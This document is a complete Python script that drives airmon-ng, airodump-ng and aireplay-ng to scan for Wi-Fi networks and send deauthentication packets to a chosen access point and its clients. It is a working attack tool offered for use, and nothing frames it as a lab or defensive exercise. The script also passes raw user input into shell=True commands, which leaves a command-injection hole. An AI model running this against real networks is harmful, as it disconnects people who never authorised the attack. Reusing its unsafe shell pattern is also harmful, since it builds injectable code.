import subprocess
import time

def execute_command(command):
    """Execute a shell command and return the output."""
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        print(output)
    except subprocess.CalledProcessError as e:
        print(f"Error executing {command}: {e.output}")

def start_monitor_mode(interface):
    """Start monitor mode on the specified interface."""
    print("[*] Starting monitor mode...")
    execute_command(f"airmon-ng start {interface}")

def stop_monitor_mode(interface):
    """Stop monitor mode on the specified interface."""
    print("[*] Stopping monitor mode...")
    execute_command(f"airmon-ng stop {interface}")

def scan_networks(interface):
    """Scan for available networks."""
    print("[*] Scanning for networks...")
    print("Press Ctrl+C after identifying the target network.")
    execute_command(f"airodump-ng {interface}")

def deauth_attack(interface, bssid, channel, clients=None):
    """Perform deauth attack on the target BSSID."""
    print(f"[*] Targeting BSSID: {bssid} on channel {channel}")

    # Set the interface to the correct channel
    print(f"[*] Setting interface {interface} to channel {channel}")
    execute_command(f"iwconfig {interface} channel {channel}")

    time.sleep(2)
    print("[*] Sending deauth packets...")
    if clients:
        for client in clients:
            execute_command(f"aireplay-ng --deauth 10 -a {bssid} -c {client} {interface}")
    else:
        execute_command(f"aireplay-ng --deauth 10 -a {bssid} {interface}")


def main():
    interface = input("Enter your wireless interface: ")
    start_monitor_mode(interface)
    monitor_interface = f"{interface}mon"

    try:
        scan_networks(monitor_interface)
        bssid = input("Enter target BSSID (MAC address of the AP): ")
        channel = input("Enter target channel: ")
        clients_input = input("Enter client MAC addresses (comma-separated) or leave blank to deauth all: ")
        clients = clients_input.split(",") if clients_input else None

        deauth_attack(monitor_interface, bssid, channel, clients)
    finally:
        stop_monitor_mode(monitor_interface)
        print("[*] Monitor mode stopped.")

if __name__ == "__main__":
    main()